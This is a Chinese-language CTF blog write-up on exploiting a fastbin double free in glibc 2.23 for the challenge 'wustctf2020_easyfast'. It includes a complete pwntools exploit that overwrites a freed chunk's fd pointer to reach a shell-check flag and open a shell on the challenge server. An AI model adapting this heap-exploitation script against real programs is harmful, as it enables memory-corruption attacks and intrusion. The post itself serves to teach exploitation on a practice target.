---
layout: post
title: "[PWN]FastbinAttack之Double free学习"
date: 2026-03-20
---
# FastbinAttack-Double free
## 分析

先来逆向看看，可以看到有个后门函数，触发方式是qword_602090等于0，而这个值默认是1。
![ref1](/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref1.png)

还有一个函数，可以分配用户输入的指定大小的堆

![ref2](/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref2.png)

漏洞出在下面的函数，这个函数本意是free掉刚刚分配的堆，但它却没有做任何限制，不检查指针，也不检查传入的堆内容，用户可以无条件的调用free，所以存在double free漏洞。

![ref3](/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref3.png)

同时，modify函数可以更改内存内容，不管free与否，所以也存在uaf

![ref6](/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref6.png)

## 原理

首先来看看一段代码
```c
int main(void) { 
void *chunk1,*chunk2,*chunk3;
 chunk1=malloc(0x10);
 chunk2=malloc(0x10);
 
 free(chunk1);
 free(chunk1);
 return 0; }
```

这个如果编译运行的话会报错，glibc会发现chunk1已经在bin中，无法再free。

```c
if (__builtin_expect (old == p, 0))
    malloc_printerr ("double free or corruption (fasttop)");

```

但有一种情况，是可以重复free掉chunk1的。

```c
int main(void) {
 void *chunk1,*chunk2,*chunk3;
 chunk1=malloc(0x10);
 chunk2=malloc(0x10);
 free(chunk1);
 free(chunk2);
 free(chunk1);
 return 0; }
```

在释放完chunk2后，main_arena指向了chunk2，所以old != p了，那么就可以再free一次chunk1了，如下图，很好的展示了chunk是怎么链接的。

![ref4](/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref4.png)

## Exploit

double_free的方法来做是这样：

```python
from pwn import *

binary = './wustctf2020_easyfast'	
context.binary = binary		
context.log_level='debug'

p = remote('node5.buuoj.cn', 25387)
elf = ELF(binary)
libc = elf.libc

def Alloc(size):
	p.recvuntil(b"choice>\n")
	p.sendline(b"1")
	p.recvuntil(b"size>\n")
	p.sendline(str(size))

def Free(index):
	p.recvuntil(b"choice>\n")
	p.sendline(b"2")
	p.recvuntil(b"index>\n")
	p.sendline(str(index))

def Modify(index,content):
	p.recvuntil(b"choice>\n")
	p.sendline(b"3")
	p.recvuntil(b"index>\n")
	p.sendline(str(index))
	p.send(content)

Alloc(0x48)
Alloc(0X48)
Free(0)
Free(1)
Free(0)
Modify(0, p64(0x602080))
Alloc(0X48)
Alloc(0x48)
Modify(3,'\x00')

p.recvuntil(b"choice>\n")
p.sendline(b"4")
p.interactive()
```

顺序是先Alloc两个块，然后free掉第一个块，随后第二个块，此时还一切正常，而当再次free掉第一个块的时候，fastbin链表就变成了前面画的图的样子，此时因为modify并不检查写入的块是否还在，因此可以往里面写入。这时候要记一张经典老图

![ref7](/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref7.png)

一个chunk的数据结构，在使用时仅包含prev_size和size，当它释放时，原userdata的一部分空间会用来放fd和bk两个指针，指向其它空闲块，因此我们再次调用modify对一个释放的块写数据，就会覆盖掉原本的fd，在它下一次分配时，会分配当前fd指向的0x602080作为空闲块，而为什么是这个，则是因为：

![ref5](/assets/images/2026-03-20-FastbinAttack-Double-free-note/ref5.png)

题目留了个后门给我们，正常情况下，2.23的glibc分配空闲块还会检查空闲块的size位正确不，而题目刚刚好把数据段的0x602088设为了0x50，刚刚好对应0x602080的size位。

不过modify完以后也只是改了指针，需要继续分配块，把0x602080分配出去，我们才能改里面的内容，注:modify完后，链表结构是这样，main_arena->chunk1->0x602080，而之前是main_arena->chunk1->chunk2->chunk1。最后两次alloc中，第一次alloc的是之前的chunk1（如果没有double free的话，本应该alloc chunk2），第二次则是0x602080，此时往里面写数据就可以覆盖掉shell_check了。不过这题虽然展示了double free的用法，但不是很好，因为modify不检查free，所以可以直接uaf，仅通过这题我也不能完全认识到double free的作用。